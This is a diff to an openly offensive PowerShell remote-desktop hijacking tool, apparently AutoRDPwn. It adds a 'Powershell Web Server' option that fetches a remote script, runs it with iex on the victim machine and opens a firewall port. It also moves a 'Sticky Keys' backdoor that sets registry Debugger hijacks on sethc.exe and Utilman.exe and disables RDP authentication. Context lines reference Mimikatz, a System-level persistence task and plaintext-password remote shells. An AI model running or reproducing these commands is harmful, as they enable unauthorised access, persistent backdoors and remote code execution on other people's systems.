@@ -279,7 +279,7 @@ if($Language -in 'Spanish') {
 
         'M' {
         Show-Banner ; Write-Host "[1] - Mimikatz" ; Write-Host "[2] - $txt9a" ; Write-Host "[3] - $txt9b" ; Write-Host "[4] - Remote Desktop Forensics"
-        Write-Host "[5] - Sticky Keys Hacking" ; Write-Host "[6] - Local Port Forwarding" ; Write-Host "[M] - $txt11" ; Write-Host ""
+        Write-Host "[5] - Sticky Keys Hacking" ; Write-Host "[6] - Local Port Forwarding" ; Write-Host "[7] - Powershell Web Server" ; Write-Host "[M] - $txt11" ; Write-Host ""
         $Random = New-Object System.Random ; $txt6 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
         $module = $Host.UI.ReadLine() ; Write-Host ""
         if($module -like '1') { Show-Banner ; Write-Host "[1] - $txt7a" ; Write-Host "[2] - $txt7b" ; Write-Host "[M] - $txt11" ; Write-Host ""
@@ -339,7 +339,9 @@ if($Language -in 'Spanish') {
         if(!$proxy){ Write-Host "" ; Write-Host "$txt36" -ForegroundColor Magenta ; sleep -milliseconds 2000 } else { netsh interface portproxy reset ; Write-Host "$txt37" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}
         if($forwarding -in '1','2','3','m') { $null } else { Write-Host "$txt4" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}
 
-	if($module -in '1','2','3','4','5','6','m') { $null }
+        if($module -like '7') { $webserver ="true" ; Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000 } 
+
+	if($module -in '1','2','3','4','5','6','7','m') { $null }
         else { Write-Host "$txt4" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}
         'X' { continue }
 
@@ -390,6 +392,12 @@ if($Language -in 'Spanish') {
     $version = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr "Microsoft Windows" | select -First 1).split(':')[1].trim()} ; Write-Host "" ; Write-Host "$txt23 $hostname.." -ForegroundColor Magenta
     $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ""
 
+    if ($stickykeys){ invoke-command -session $RDP[0] -scriptblock { 
+    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
+    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
+    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f 2>&1> $null
+    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f 2>&1> $null }}
+
         if($version -Like '*Server*') { Write-Host "$version $using:txt24"
         invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Yellow' ; Write-Host ""
         (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
@@ -430,11 +438,9 @@ $action = New-ScheduledTaskAction -Execute powershell -Argument "-ExecutionPolic
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -Description "AutoRDPwn" -TaskPath Microsoft\Windows\Powershell\ScheduledJobs -User "System" > $null }}
 
 Write-Host "" ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host $txt28 ; sleep -milliseconds 3000 
-if ($stickykeys){ invoke-command -session $RDP[0] -scriptblock { 
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
-REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f 2>&1> $null
-REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f 2>&1> $null }}
+if ($webserver){ invoke-command -session $RDP[0] -scriptblock { 
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Start-WebServer.ps1 -UseBasicParsing | iex
+netsh advfirewall firewall add rule name="Powershell Webserver" dir=in action=allow protocol=TCP localport=8080 }}
 
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt29 <<" ; Write-Host "" ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
 else { Write-Host "" ; Write-Host "$txt30" -ForegroundColor Red ; sleep -milliseconds 3000 }} if($tsfail) { Write-Host "" ; Write-Host "$txt30" -ForegroundColor Red ; sleep -milliseconds 3000 }}
